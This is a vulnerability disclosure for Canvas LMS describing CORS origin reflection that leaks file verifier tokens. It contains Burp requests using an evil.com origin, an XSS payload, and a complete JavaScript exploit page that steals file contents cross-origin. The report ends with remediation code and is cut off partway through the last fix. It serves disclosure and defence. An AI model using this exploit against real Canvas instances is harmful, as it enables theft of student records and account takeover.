# Canvas LMS - vrelease_2026-05-20.143 - CORS Misconfiguration

| Field | Value |
| --- | --- |
| Vulnerability name | CORS Misconfiguration |
| Vulnerability type | software |
| Product name | Canvas LMS |
| Product vendor | Instructure |
| Product version | release_2026-05-20.143 |
| Product link | https://www.instructure.com/ |
| Product environment | web |
| Severity | Critical |
| CVSS score | 9.3 |
| CVSS vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H |
| Affected assets | 4000 |
| Affected users | 30000000 |
| Date of reporting | 2026-04-20 |
| Vendor acknowledgement | No |
| Credit | 0xhamy |
| Date published | 2026-05-06T14:26:02.18095+00:00 |
| Last modified | 2026-05-06T14:49:08.903189+00:00 |

---

# CORS Origin Reflection on Files Endpoints Enables Authentication Bypass and Mass Data Exfiltration in Canvas LMS

Thanks to [Basant Kumar](https://www.linkedin.com/in/basant1/) for assisting with identifying this vulnerability.

---

## Severity

**CVSS 3.1 Score:** 9.3 (Critical)


| Metric              | Justification                                                                                                                                                                           |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Attack Vector       | Exploitable from any attacker-controlled website                                                                                                                                        |
| Attack Complexity   | No race conditions, no special prerequisites                                                                                                                                            |
| Privileges Required | Attacker needs no Canvas account whatsoever                                                                                                                                             |
| User Interaction    | Victim must visit an attacker-controlled page while authenticated to Canvas                                                                                                             |
| Scope               | CORS vulnerability in the Files subsystem crosses into the Authentication boundary — leaked `uuid` values serve as permanent authentication-bypass tokens that work without any session |
| Confidentiality     | All files accessible to the victim are exfiltrable, including grades, SIS data, student PII, exam answer keys                                                                           |
| Integrity           | Cross-origin file upload possible; with admin target, grades and accounts can be modified                                                                                               |
| ++Availability      | Conservative — no direct denial of service demonstrated in this chain                                                                                                                   |

**With Stored XSS escalation (instances without files domain separation):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` = **9.6**

---

## Vulnerability Type

- **Primary:** CWE-942 — Overly Permissive Cross-domain Whitelist (CORS origin reflection)
- **Secondary:** CWE-639 — Authorization Bypass Through User-Controlled Key (file verifier tokens)
- **Tertiary:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Stored XSS via inline HTML rendering)

**OWASP Top 10:** A01:2021 — Broken Access Control **MITRE ATT&CK:** T1557 (Adversary-in-the-Middle), T1530 (Data from Cloud Storage), T1189 (Drive-by Compromise)

---

## URL / Location

**Affected endpoints** (all within `app/controllers/files_controller.rb`):

| Endpoint | Route | CORS Type | Impact |
|----------|-------|-----------|--------|
| `show` | `GET /files/:id` | `open_limited_cors` | Origin reflection + credential leak via JSON |
| `show` (JSON) | `GET /files/:id?format=json` | `open_limited_cors` | UUID/verifier token leak in response body |
| `api_create` | `POST /files_api` | `open_cors` | Cross-origin file upload (skips CSRF) |
| `api_create_success` | `POST /api/v1/files/:id/create_success` | `open_cors` | Upload finalization |
| `show_thumbnail` | `GET /images/thumbnails/show/:id/:uuid` | `open_cors` | Thumbnail exfiltration |

**Root cause location:** `app/controllers/files_controller.rb`, lines 1811-1822:

```ruby
# Line 1811-1816
def open_cors
  headers["Access-Control-Allow-Origin"] = request.headers["origin"]
  headers["Access-Control-Allow-Credentials"] = "true"
  headers["Access-Control-Allow-Methods"] = "POST, PUT, DELETE, GET, OPTIONS"
  headers["Access-Control-Request-Method"] = "*"
  headers["Access-Control-Allow-Headers"] = "Origin, X-Requested-With, Content-Type, Accept, Authorization, Accept-Encoding"
end

# Line 1819-1822
def open_limited_cors
  headers["Access-Control-Allow-Origin"] = request.headers["origin"]
  headers["Access-Control-Allow-Credentials"] = "true"
  headers["Access-Control-Allow-Methods"] = "GET, HEAD"
end
```

Both methods reflect `request.headers["origin"]` verbatim into `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. No origin validation is performed.

**Tested on:** Canvas LMS current master — Rails 8.0.5, Ruby 3.4.1, Puma 7.2.0 (`localhost:3000`)

---

## Description

The Canvas LMS `FilesController` implements two CORS helper methods (`open_cors` and `open_limited_cors`) that reflect any `Origin` request header into the `Access-Control-Allow-Origin` response header without validation, while simultaneously setting `Access-Control-Allow-Credentials: true`. This allows any attacker-controlled website to make authenticated cross-origin requests to Canvas file endpoints and read the responses.

This is not merely a cross-origin data read. The JSON response from `/files/:id?format=json` includes the file's `uuid` field, which doubles as a **permanent authentication-bypass token** (referred to as a "verifier" in Canvas internals). Once an attacker extracts this `uuid` via CORS, they can construct a URL (`/files/:id/download?verifier=<uuid>`) that serves the file's contents **without any authentication** — no cookies, no API tokens, no session of any kind. This verifier never expires, survives password changes, and works even after the victim's account is locked.

The vulnerability chain is amplified by three design decisions in Canvas:

1. **`SameSite=None` session cookies:** Canvas sets `SameSite=None; Secure` on the `_normandy_session` cookie (required for LTI iframe support), ensuring browsers send authentication cookies on cross-origin requests from any domain.

2. **No file type restrictions on HTML:** Canvas accepts HTML file uploads and serves them with `Content-Type: text/html` and `Content-Disposition: inline`, enabling stored XSS execution.

3. **Absent Content Security Policy on file responses:** File download responses include only a `frame-ancestors` CSP directive — no `script-src` or `default-src` — so JavaScript in uploaded HTML files executes without restriction.

Canvas serves over 100 million users across thousands of universities and institutions worldwide. Files in Canvas include student grades, exam submissions, SIS import data (student PII), course materials, and institutional documents — all protected under FERPA and GDPR.

---

## Steps to Reproduce

### Prerequisites

- A Canvas LMS instance (we used `localhost:3000`, built from current master branch)
- A web browser (Chrome or Firefox)
- Burp Suite Community or Professional edition, running as a proxy on `127.0.0.1:8080`
- Your browser configured to route traffic through the Burp proxy (in Chrome: Settings > System > "Open your computer's proxy settings" > set HTTP proxy to `127.0.0.1` port `8080`; or use the FoxyProxy extension for easy toggling)
- A Canvas user account, logged in via the browser

All reproduction steps below use **only** the browser and Burp Suite Repeater. No terminal commands are used.

---

### Step 1: Upload Test Files to Canvas

We need two test files: a plain-text file containing sensitive data, and an HTML file containing a JavaScript payload (our XSS proof of concept).

**1a. Create the test files on your computer:**

Open any text editor (Notepad, TextEdit, VS Code, etc.) and create two files:

**File 1 — `secret-grades.txt`** (save with this exact filename):
```
These are confidential student grades - DO NOT SHARE
Student A: 95/100
Student B: 87/100
Student C: 72/100
```

**File 2 — `notes.html`** (save with this exact filename):
```html
<!DOCTYPE html>
<html><body>
<h1>XSS Test</h1>
<script>alert('XSS on ' + document.domain)</script>
</body></html>
```

This HTML file is our XSS proof-of-concept payload. When Canvas serves it inline as `text/html`, the `<script>` tag will execute on the Canvas domain, popping an alert box that displays the domain name. This proves arbitrary JavaScript execution.

**1b. Upload the files to Canvas:**

1. Open your browser (with Burp proxy active) and go to `http://localhost:3000`
2. Log in with your Canvas user account
3. In the left sidebar, click **"Files"** (it has a folder icon). This opens your personal files area.
4. You will see an **"Upload"** button in the top-right area of the Files page. Click it.
5. In the file picker dialog that appears, navigate to where you saved `secret-grades.txt` and select it. Click **Open/Upload**.
6. Wait for the upload to complete. You will see `secret-grades.txt` appear in your file list.
7. Click the **"Upload"** button again and repeat the process for `notes.html`.
8. Both files should now be visible in your Files list.

**1c. Note the file IDs:**

After uploading, click on each file in the Files list. Look at your browser's address bar — the URL will contain the file ID. For example:
- `http://localhost:3000/files/7` means the file ID is **7**
- `http://localhost:3000/files/8` means the file ID is **8**

In our testing, the IDs were:
- **File 7** = `secret-grades.txt`
- **File 8** = `notes.html`

Your IDs may differ. Use whatever IDs your instance assigned.

![Canvas Files page showing uploaded test files](./04-canvas-files-page-uploads.png)

---

### Step 2: Test CORS Origin Reflection (Burp Suite Repeater)

This step proves that Canvas reflects any `Origin` header back in its CORS response, allowing any website to read authenticated responses cross-origin.

**2a. Get your session cookie from Burp:**

1. Open **Burp Suite**
2. Click the **"Proxy"** tab at the top
3. Click the **"HTTP history"** sub-tab
4. Look through the list of requests for any request to `localhost:3000` (you should see several from your login and file uploads)
5. Click on any one of those requests
6. In the **Request** pane below, look for the `Cookie:` header line. It will contain something like:
   ```
   Cookie: _normandy_session=abc123def456...
   ```
7. Select and copy the **entire value** after `Cookie: ` (everything on that line). You will need this in the next step.

**2b. Send the CORS test request:**

1. In Burp Suite, click the **"Repeater"** tab at the top
2. Click the **"+"** button (or press Ctrl+T) to create a new Repeater tab
3. At the top of the Repeater tab, you will see a **"Target"** field. Type: `http://localhost:3000`
4. In the large **Request** editor pane, type (or paste) the following HTTP request **exactly** as shown. Replace `<YOUR_SESSION_COOKIE>` with the cookie value you copied in step 2a:

```
GET /files/7?format=json HTTP/1.1
Host: localhost:3000
Origin: https://evil.com
Cookie: _normandy_session=<YOUR_SESSION_COOKIE>
Connection: close

```

**Important:** There must be a blank line after `Connection: close` — this signals the end of the HTTP headers.

5. Click the **"Send"** button (top-left of the Repeater tab)

**2c. Examine the response:**

The Response pane on the right will populate. You should see a response like this:

**Response Headers:**
```
HTTP/1.1 200 OK
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
access-control-allow-methods: GET, HEAD
content-type: application/json; charset=utf-8
content-security-policy: frame-ancestors 'self' localhost:3000;
```

**Response Body:**
```json
{"attachment":{"workflow_state":"processed","content_type":"text/plain","public_url":"http://localhost:3000/users/1/files/7/download?verifier=gte8Y3E54aszwUCMeOD4YTGMvzeAeXhxZdbkVrGe","id":7,"folder_id":1,"display_name":"secret-grades.txt","filename":"1775536299_214__secret-grades.txt","uuid":"gte8Y3E54aszwUCMeOD4YTGMvzeAeXhxZdbkVrGe","upload_status":"success","content-type":"text/plain","url":"http://localhost:3000/files/7/download?download_frd=1","size":107,"created_at":"2026-04-07T04:32:19Z","updated_at":"2026-04-07T04:32:19Z","unlock_at":null,"locked":false,"hidden":false,"lock_at":null,"hidden_for_user":false,"thumbnail_url":null,"modified_at":"2026-04-07T04:32:19Z","mime_class":"text","media_entry_id":null,"category":"uncategorized","locked_for_user":false,"preview_url":"/users/1/files/7/file_preview?annotate=0","canvadoc_session_url":null}}
```

**What to look for (critical evidence):**

In the **response headers**, locate these three lines:
- `access-control-allow-origin: https://evil.com` — Canvas reflected our attacker origin
- `access-control-allow-credentials: true` — Canvas allows credentials (cookies) on cross-origin requests
- `access-control-allow-methods: GET, HEAD` — Canvas allows GET requests cross-origin

In the **response body**, locate the `"uuid"` field:
- `"uuid":"gte8Y3E54aszwUCMeOD4YTGMvzeAeXhxZdbkVrGe"`

This proves that **any website** (in this case `https://evil.com`) can make an authenticated request to Canvas and read the full JSON response, including the file's secret `uuid` token.

![Burp Repeater — CORS origin reflection + uuid verifier leak](./01-cors-reflection-verifier-leak.png)

---

### Step 3: Extract the Verifier Token

From the JSON response you received in Step 2, locate these two critical fields:

1. **`"uuid"` field:** `gte8Y3E54aszwUCMeOD4YTGMvzeAeXhxZdbkVrGe`

   This UUID **is** the authentication-bypass token. Canvas internally calls it a "verifier." Anyone who possesses this value can download the file without logging in — no cookies, no session, no API key. It never expires and survives password changes.

2. **`"public_url"` field:** `http://localhost:3000/users/1/files/7/download?verifier=gte8Y3E54aszwUCMeOD4YTGMvzeAeXhxZdbkVrGe`

   Canvas pre-builds the full bypass URL for us. This URL includes the verifier and grants unauthenticated access to the file.

Both values are freely readable by any cross-origin attacker page due to the CORS misconfiguration proven in Step 2.

---

### Step 4: Prove Authentication Bypass

This step proves that the leaked verifier token grants full file access **without any authentication whatsoever**.

**4a. Access the file with only the verifier (no login):**

1. In Burp Suite, click the **"Repeater"** tab
2. Click **"+"** to open a **new** Repeater tab (do not reuse the previous one — we want to keep both as evidence)
3. Set the **Target** to: `http://localhost:3000`
4. In the Request editor, type the following request **exactly** as shown. **Notice there is NO Cookie header — this request is completely unauthenticated:**

```
GET /files/7/download?verifier=gte8Y3E54aszwUCMeOD4YTGMvzeAeXhxZdbkVrGe HTTP/1.1
Host: localhost:3000
Connection: close

```

5. Click **"Send"**

**Expected response:**
```
HTTP/1.1 200 OK
content-type: text/plain
content-disposition: inline; filename="secret-grades.txt"; filename*=UTF-8''secret-grades.txt
content-security-policy: frame-ancestors 'self' localhost:3000;

These are confidential student grades - DO NOT SHARE
Student A: 95/100
Student B: 87/100
Student C: 72/100
```

**What this proves:** There is **no Cookie header** in the request. No login. No session. No API token. The only thing authenticating this request is the `verifier` parameter in the URL — which was leaked cross-origin via the CORS vulnerability in Step 2. The file's full contents are returned with HTTP 200.

![Burp Repeater — Authentication bypass: NO cookies, file contents returned](./02-auth-bypass-no-cookie-200.png)

**4b. Control test — confirm authentication is required without the verifier:**

1. Open another **new** Repeater tab (click "+")
2. Set the **Target** to: `http://localhost:3000`
3. In the Request editor, type the same request but **without** the verifier parameter:

```
GET /files/7/download HTTP/1.1
Host: localhost:3000
Connection: close

```

4. Click **"Send"**

**Expected response:**
```
HTTP/1.1 302 Found
Location: http://localhost:3000/login
```

The server redirects to the login page because there are no credentials and no verifier. This confirms that the verifier token is what bypasses authentication.

![Burp Repeater — Control test: 302 redirect to /login without verifier](./03-control-test-no-verifier-302.png)

---

### Step 5: Prove Stored XSS via HTML Inline Rendering

This step demonstrates that the same CORS vulnerability can leak the verifier for HTML files, and Canvas serves those HTML files inline with JavaScript execution — resulting in stored XSS on the Canvas domain.

**5a. Leak the verifier for the HTML file via CORS:**

1. In Burp Suite Repeater, open a **new** tab (click "+")
2. Set the **Target** to: `http://localhost:3000`
3. Type the following request (replace `<YOUR_SESSION_COOKIE>` with your session cookie from Step 2a):

```
GET /files/8?format=json HTTP/1.1
Host: localhost:3000
Origin: https://evil.com
Cookie: _normandy_session=<YOUR_SESSION_COOKIE>
Connection: close

```

4. Click **"Send"**
5. In the JSON response body, locate the `"uuid"` field. Our value was: `8IIMUC3Wzq6omLBMWexQTUU8EFeOPDEAihNVuRVB`

![Burp Repeater — CORS response for notes.html with uuid](./01-cors-reflection-verifier-leak.png)

**5b. Verify inline HTML rendering in Burp Repeater:**

1. Open a **new** Repeater tab
2. Set the **Target** to: `http://localhost:3000`
3. Type this request (no Cookie header — unauthenticated, using only the leaked verifier):

```
GET /files/8/download?verifier=8IIMUC3Wzq6omLBMWexQTUU8EFeOPDEAihNVuRVB HTTP/1.1
Host: localhost:3000
Connection: close

```

4. Click **"Send"**

**Expected response:**
```
HTTP/1.1 200 OK
content-type: text/html
content-disposition: inline; filename="notes.html"; filename*=UTF-8''notes.html
content-security-policy: frame-ancestors 'self' localhost:3000;

<!DOCTYPE html>
<html><body>
<h1>XSS Test</h1>
<script>alert('XSS on ' + document.domain)</script>
</body></html>
```

**Examine the response headers carefully:**

- `content-type: text/html` — Canvas tells the browser this is an HTML page
- `content-disposition: inline` — Canvas tells the browser to **render** this file in the browser window (not download it as an attachment)
- `content-security-policy: frame-ancestors 'self' localhost:3000;` — The CSP **only** restricts framing. There is **no** `script-src` directive, **no** `default-src` directive. JavaScript execution is completely unrestricted.

This combination means: when a user opens this URL in a browser, the HTML file renders as a web page on the Canvas domain, and the `<script>` tag executes with full access to the Canvas origin.

**5c. Trigger the XSS in a browser:**

1. **Temporarily disable Burp proxy** in your browser settings (or use a browser that is not proxied), so the request goes directly to Canvas
2. Open your browser and paste this URL into the address bar:
   ```
   http://localhost:3000/files/8/download?verifier=8IIMUC3Wzq6omLBMWexQTUU8EFeOPDEAihNVuRVB
   ```
3. Press Enter

**What happens:** You will see an **alert dialog box** pop up in the browser displaying the text:
```
XSS on localhost
```

This confirms that JavaScript from our uploaded HTML file executed on the Canvas domain (`localhost`). In a real attack, this script could steal session cookies, make API calls as the victim, create backdoor admin accounts, modify grades, or exfiltrate all student data.

![Browser — XSS alert "XSS on localhost" on Canvas domain](./05-xss-alert-on-canvas-domain.png)

---

### Step 6: Full Attack Chain PoC (Browser-Based End-to-End)

This step demonstrates the complete attack as it would work in the real world: a victim visits an attacker-controlled web page, and their Canvas files are silently exfiltrated cross-origin.

**6a. Create the PoC HTML file:**

Open a text editor and save the following as `exploit-poc.html` on your computer:

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Canvas LMS CORS PoC - VULN-1</title>
<style>
  body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 30px; max-width: 900px; margin: 0 auto; }
  h1 { color: #f85149; border-bottom: 2px solid #f85149; padding-bottom: 10px; }
  h2 { color: #58a6ff; margin-top: 30px; }
  .badge { background: #f85149; color: #fff; padding: 3px 10px; border-radius: 10px; font-size: 0.8em; }
  pre { background: #161b22; border: 1px solid #30363d; padding: 16px; overflow-x: auto; white-space: pre-wrap; border-radius: 6px; }
  .ok { color: #3fb950; }
  .fail { color: #f85149; }
  .info { color: #58a6ff; }
  .warn { color: #d29922; }
  button { background: #238636; color: #fff; border: none; padding: 12px 24px; font-size: 16px; cursor: pointer; border-radius: 6px; margin: 5px; }
  button:hover { background: #2ea043; }
  button.danger { background: #da3633; }
  button.danger:hover { background: #f85149; }
  button:disabled { opacity: 0.5; cursor: not-allowed; }
</style>
</head>
<body>

<h1>VULN-1: Canvas LMS CORS Exploit <span class="badge">P1 / CRITICAL</span></h1>
<p>Cross-Origin file theft via permissive CORS + leaked verifier tokens</p>
<p><strong>Target:</strong> <input id="target" value="http://localhost:3000"
   style="background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:5px;width:300px;">
   <strong>File ID:</strong> <input id="fileid" value="7"
   style="background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:5px;width:50px;"></p>

<button onclick="runExploit()" id="btn1">Run Full Exploit Chain</button>
<button class="danger" onclick="runXSS()" id="btn2">Run XSS Chain (File 8)</button>

<h2>Execution Log</h2>
<pre id="log">Click a button to start...</pre>

<h2>Stolen File Contents</h2>
<pre id="stolen">Waiting...</pre>

<h2>XSS Verifier URL</h2>
<pre id="xssurl">Waiting...</pre>

<script>
var logEl = document.getElementById('log');
var stolenEl = document.getElementById('stolen');
var xssEl = document.getElementById('xssurl');

function log(msg, cls) {
  var line = document.createElement('div');
  line.className = cls || '';
  line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  if (logEl.textContent === 'Click a button to start...') logEl.textContent = '';
  logEl.appendChild(line);
}

// FULL EXPLOIT CHAIN: CORS -> Verifier Leak -> File Theft
async function runExploit() {
  var CANVAS = document.getElementById('target').value.replace(/\/+$/, '');
  var FILE_ID = document.getElementById('fileid').value;
  document.getElementById('btn1').disabled = true;
  logEl.textContent = ''; stolenEl.textContent = '';

  // STEP 1: Credentialed CORS fetch (browser sends victim's cookies)
  log('STEP 1: Sending credentialed cross-origin request...', 'info');
  log('  GET ' + CANVAS + '/files/' + FILE_ID + '?format=json', 'info');
  log('  credentials: include (browser sends victim cookies)', 'info');

  var resp;
  try {
    resp = await fetch(CANVAS + '/files/' + FILE_ID + '?format=json', {
      credentials: 'include'
    });
  } catch(e) {
    log('NETWORK ERROR: ' + e.message, 'fail');
    document.getElementById('btn1').disabled = false;
    return;
  }

  // STEP 2: Verify CORS allowed the read
  log('STEP 2: Response received - HTTP ' + resp.status, 'info');
  if (!resp.ok) {
    log('FAILED: victim not logged in or file not found', 'fail');
    document.getElementById('btn1').disabled = false;
    return;
  }
  log('CORS CONFIRMED: Canvas reflected our origin!', 'ok');

  // STEP 3: Extract verifier token from JSON
  var data = await resp.json();
  var fileData = data.attachment || data;
  var uuid = fileData.uuid;
  if (!uuid) {
    log('No uuid field found!', 'fail');
    document.getElementById('btn1').disabled = false;
    return;
  }
  log('STEP 3: Verifier token extracted!', 'info');
  log('  File: ' + fileData.display_name, 'ok');
  log('  UUID (verifier): ' + uuid, 'ok');

  // STEP 4: Download file WITHOUT any authentication
  var bypassUrl = CANVAS + '/files/' + fileData.id + '/download?verifier=' + uuid;
  log('STEP 4: Downloading file with NO authentication...', 'info');
  log('  credentials: omit (deliberately NOT sending cookies)', 'info');

  var fileResp;
  try {
    fileResp = await fetch(bypassUrl, { credentials: 'omit' });
  } catch(e) {
    log('Download error - open URL directly: ' + bypassUrl, 'warn');
    stolenEl.textContent = 'Open directly:\n' + bypassUrl;
    document.getElementById('btn1').disabled = false;
    return;
  }

  var content = await fileResp.text();
  log('FILE STOLEN SUCCESSFULLY! (' + content.length + ' bytes)', 'ok');
  log('=== PROOF ===', 'ok');
  log('Attacker origin: ' + window.location.origin, 'ok');
  log('Verifier (permanent auth bypass): ' + uuid, 'ok');
  log('No cookies were needed to download the file.', 'ok');

  stolenEl.textContent = '=== STOLEN FILE: ' + fileData.display_name +
    ' ===\n\n' + content + '\n\n=== END ===\n\nBypass URL (works without login, forever):\n' + bypassUrl;
  stolenEl.className = 'ok';
  document.getElementById('btn1').disabled = false;
}

// XSS CHAIN: CORS -> Verifier Leak for HTML file -> JS execution on Canvas domain
async function runXSS() {
  var CANVAS = document.getElementById('target').value.replace(/\/+$/, '');
  document.getElementById('btn2').disabled = true;
  log('--- XSS CHAIN ---', 'warn');

  var resp;
  try {
    resp = await fetch(CANVAS + '/files/8?format=json', { credentials: 'include' });
  } catch(e) {
    log('ERROR: ' + e.message, 'fail');
    document.getElementById('btn2').disabled = false;
    return;
  }
  if (!resp.ok) { log('HTTP ' + resp.status, 'fail'); document.getElementById('btn2').disabled = false; return; }

  var data = await resp.json();
  var fileData = data.attachment || data;
  var uuid = fileData.uuid;
  var xssUrl = CANVAS + '/files/' + fileData.id + '/download?verifier=' + uuid;

  log('XSS verifier extracted: ' + uuid, 'ok');
  log('Open this URL to trigger XSS on Canvas domain:', 'warn');
  log(xssUrl, 'ok');

  xssEl.textContent = xssUrl + '\n\nOpen in browser -> JavaScript executes on Canvas domain.';
  xssEl.className = 'ok';
  document.getElementById('btn2').disabled = false;
}
</script>
</body>
</html>
```

**6b. How the PoC works (step by step):**

1. **Phase 1 — Cross-origin metadata fetch:** The page uses `fetch()` with `credentials: "include"` to request `http://localhost:3000/files/7?format=json` from the attacker's origin. Because Canvas sets `SameSite=None` on its session cookie, the browser automatically attaches the victim's `_normandy_session` cookie to this cross-origin request. Because Canvas reflects any `Origin` into `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`, the browser allows the attacker's JavaScript to read the response. The response contains the file's `uuid` (verifier token).

2. **Phase 2 — Unauthenticated file download:** Using the stolen verifier, the page constructs a download URL (`/files/7/download?verifier=...`) and fetches it with `credentials: "omit"` — deliberately **not** sending any cookies. The verifier alone bypasses all authentication. The file contents are returned in full.

3. **Display:** The stolen file contents are rendered on the attacker's page. In a real attack, this data would be silently exfiltrated to the attacker's server via `fetch()` to a collection endpoint.

**6c. Run the PoC:**

1. Serve the PoC from a different origin than Canvas (e.g., `python3 -m http.server 9999` in the same directory)
2. Make sure you are **logged into Canvas** at `http://localhost:3000` in the same browser
3. Open `http://localhost:9999/exploit-poc.html` in a new tab
4. Click **"Run Full Exploit Chain"**

**What you will see:** The execution log shows each step completing, the verifier token being extracted, and the full contents of `secret-grades.txt` displayed in the "Stolen File Contents" section — all from a cross-origin attacker page.

![PoC exploit page showing stolen file contents cross-origin](./06-poc-exploit-stolen-contents.png)

---

## Impact

### Direct Impact — Any Authenticated User as Victim

An attacker can create a webpage that, when visited by any Canvas user, silently:

1. **Enumerates all files** accessible to the victim by iterating sequential file IDs via `GET /files/:id?format=json`
2. **Extracts permanent access tokens** (uuid/verifier values) for every discovered file
3. **Downloads file contents** using the leaked verifiers without any further authentication
4. **Retains permanent access** — verifiers never expire, survive password resets, and work after session invalidation or account lockout

The attacker requires zero Canvas credentials and zero prior knowledge of the target institution.

### Escalated Impact — Administrator as Victim

When the victim is a Canvas administrator, the attacker gains access to:

- **All institutional files** across every course, user, and group
- **Student Information System (SIS) batch files** containing student PII (names, student IDs, addresses, enrollment data)
- **Exam submissions and grade records** for the entire institution
- **Course materials** including unpublished answer keys and upcoming assessments

Via the Stored XSS chain (on instances without files domain separation), an attacker can additionally:

- Create backdoor administrator accounts
- Modify grades institution-wide
- Export all student data via provisioning reports
- Install persistent malicious LTI tools across all courses
- Masquerade as any user in the institution

### Regulatory Impact

- **FERPA violation** (U.S.) — Unauthorized disclosure of student education records is a federal violation
- **GDPR violation** (EU institutions) — Constitutes a personal data breach requiring 72-hour supervisory authority notification
- **Institutional accreditation risk** — Academic integrity is compromised if grades can be read or modified

### Scale

Canvas LMS serves **100+ million users** across thousands of universities and institutions globally. File IDs are sequential integers, making automated mass enumeration trivial. A single malicious link distributed via phishing, social media, or embedded in a Canvas announcement could compromise every user who clicks it.

---

## Attack Chains

### Chain 1: CORS to Verifier Leak to Authentication Bypass (Primary — CVSS 9.3)

```
                        Victim visits attacker page
                                    |
                                    v
        attacker.com ----[CORS fetch /files/:id?format=json]----> Canvas
            ^               (victim's _normandy_session cookie            
            |                sent automatically via SameSite=None)
            |                           |
            +--- JSON response ----------+
            |    includes "uuid" field
            |    (= permanent auth-bypass verifier)
            |
            v
        Attacker constructs: /files/:id/download?verifier=<uuid>
            |
            v
        File contents served — NO AUTHENTICATION REQUIRED
        Works permanently. Survives password changes.
```

**Confidence:** HIGH — confirmed on live instance. All code paths verified in source.

### Chain 2: CORS to HTML Upload to Stored XSS (Escalation — CVSS 9.6)

```
        attacker.com ----[CORS POST to upload endpoints]----> Canvas
                              |
                              v
                    Malicious .html file uploaded to victim's account
                              |
                              v
                    Victim (or any user with link) opens file
                              |
                              v
                    Canvas serves file inline as text/html
                    (no script-src CSP, no file type restriction)
                              |
                              v
                    JavaScript executes on Canvas origin
                    → Read API data, create API tokens, modify grades
                    → Full account takeover
```

**Variant A (self-hosted, no files domain):** XSS executes on the main Canvas domain with full session access. **CRITICAL.**

**Variant B (Instructure-hosted, files domain configured):** XSS executes on the files subdomain. The same CORS vulnerability bridges back to the main domain, enabling data exfiltration from the files domain context.

### Chain 3: Mass Exploitation via Canvas-Native Distribution

```
        Compromised instructor account (or attacker with student role)
                              |
                              v
        Posts announcement/discussion/assignment with link to attacker page
                              |
                              v
        ALL enrolled students visit the link as part of normal coursework
                              |
                              v
        Chain 1 executes silently for each student
        → Mass file exfiltration + permanent verifier harvesting
```

At a large university (50,000+ users), a single malicious announcement link could compromise thousands of students' files within hours.

---

## Affected Defenses — Why Every Canvas Security Control Fails

| Defense Layer | Current State | Why It Fails |
|---------------|---------------|--------------|
| **SameSite cookie** | `SameSite=None; Secure` | Canvas requires this for LTI iframe support — session cookies are sent to any cross-origin request |
| **HttpOnly cookie** | `true` | Prevents cookie theft via `document.cookie`, but CORS allows reading authenticated responses directly — cookie theft is unnecessary |
| **CSP (main domain)** | Optional, disabled by default | Even when enabled: policy includes `unsafe-inline` and `unsafe-eval`, providing no meaningful XSS protection |
| **CSP (file responses)** | `frame-ancestors` only | No `script-src` or `default-src` directive — uploaded JavaScript executes without restriction |
| **X-Frame-Options** | Removed | Canvas needs cross-domain iframe embedding for LTI tools |
| **File type blocklist** | None | HTML, SVG, and other executable content types are accepted without restriction |
| **HTML rendering mode** | `Content-Disposition: inline` | `inline_content?` returns `true` for `.html` — files render in the browser instead of forcing download |
| **Files domain separation** | Present on Instructure-hosted; absent on many self-hosted instances | CORS origin reflection bridges the separation — JavaScript on the files domain can read main-domain responses |
| **CSRF protection** | Skipped on `api_create` | `skip_before_action :verify_authenticity_token` on the file upload endpoint |
| **Feature flag `deprecate_uuid_in_files_api`** | Exists but OFF by default | UUID (= verifier) is freely returned in all file JSON responses on most instances |

The combination of `SameSite=None` (required for LTI), `Access-Control-Allow-Credentials: true` (set by the CORS methods), and unrestricted origin reflection creates a condition where no existing Canvas defense can prevent cross-origin authenticated data access.

---

## Remediation

### Fix 1: Validate CORS Origins Against a Whitelist (Critical — Fixes Root Cause)

Replace the open origin reflection with strict validation:

```ruby
# app/controllers/files_controller.rb

ALLOWED_CORS_ORIGIN_PATTERNS = [
  # Match the institution's own Canvas domain
  ->(origin) { origin == "https://#{HostUrl.default_host}" },
  # Match the configured files domain
  ->(origin) { origin == "https://#{HostUrl.file_host(Account.default)}" },
  # Match known LTI tool origins (loaded from configuration)
  ->(origin) { Setting.get("cors_allowed_origins", "").split(",").include?(origin) }
].freeze

def open_cors
  origin = request.headers["origin"]
  if origin.present? && ALLOWED_CORS_ORIGIN_PATTERNS.any? { |pattern| pattern.call(origin) }
    headers["Access-Control-Allow-Origin"] = origin
    headers["Access-Control-Allow-Credentials"] = "true"
    headers["Access-Control-Allow-Methods"] = "POST, PUT, DELETE, GET, OPTIONS"
    headers["Access-Control-Request-Method"] = "*"
    headers["Access-Control-Allow-Headers"] = "Origin, X-Requested-With, Content-Type, Accept, Authorization, Accept-Encoding"
    headers["Vary"] = "Origin"
  end
end

def open_limited_cors
  origin = request.headers["origin"]
  if origin.present? && ALLOWED_CORS_ORIGIN_PATTERNS.any? { |pattern| pattern.call(origin) }
    headers["Access-Control-Allow-Origin"] = origin
    headers["Access-Control-Allow-Credentials"] = "true"
    headers["Access-Control-Allow-Methods"] = "GET, HEAD"
    headers["Vary"] = "Origin"
  end
end
```

### Fix 2: Enable `deprecate_uuid_in_files_api` by Default (High — Eliminates Verifier Leak)

The feature flag `deprecate_uuid_in_files_api` already exists in Canvas but is disabled by default. Enabling it removes the `uuid` field from JSON API responses, eliminating the authentication-bypass token leak:

```ruby
# Enable by default in config/feature_flags/files_domain.yml
deprecate_uuid_in_files_api:
  state: allowed_on  # Change from 'allowed' to 'allowed_on'
  display_name: "Deprecate UUID in Files API"
  description: "Removes file UUID from API responses to prevent verifier token leakage"
  applies_to: RootAccount
```

### Fix 3: Add CSP `script-src` to File Responses (Medium — Blocks Stored XSS)

```ruby
# In the file download response path
headers["Content-Security-Policy"] = "default-src 'none'; script-src 'none'; style-src 'unsafe-inline'; img-src 'self'; frame-ancestors 'self' #{HostUrl.default_host}"
```

### Fix 4: Force `Content-Disposition: attachment` for HTML Files (Medium — Defense in Depth)

```ruby
# app/models/attachment.rb — modify inline_content?
def inline_content?
  # Never serve HTML/SVG inline — too dangerous for XSS
  return false if content_type&.start_with?("text/html") || 
